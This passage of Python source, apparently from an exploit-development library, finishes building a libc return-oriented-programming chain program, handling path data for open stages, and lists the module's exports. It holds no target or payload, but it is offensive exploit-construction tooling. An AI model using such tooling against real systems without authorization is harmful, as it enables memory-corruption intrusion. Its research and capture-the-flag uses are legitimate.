            stage.arguments[0] for stage in normalized if stage.operation is LibcROPStageKind.OPEN and stage.arguments
        )
        inline_path = any(
            isinstance(argument, InlineDataReference) and argument.tag == "path" for argument in open_path_arguments
        )
        external_path_addresses = tuple(
            argument for argument in open_path_arguments if not isinstance(argument, InlineDataReference)
        )
        external_placements = tuple(
            placement
            for placement in self.external_placements
            if any(_same_address(placement.address, address) for address in external_path_addresses)
        )
        needs_path_data = inline_path or bool(external_placements)
        return LibcROPProgram(
            self.libc,
            self.adapter,
            normalized,
            self.path_data if needs_path_data else b"",
            inline_path,
            external_placements,
        )


__all__ = [
    "DataPlacement",
    "InlineDataReference",
    "LibcROPBuilder",
    "LibcROPError",
    "LibcROPProgram",
    "LibcROPStage",
    "LibcROPStageKind",
    "LoweredLibcROP",
    "WritableArea",
]
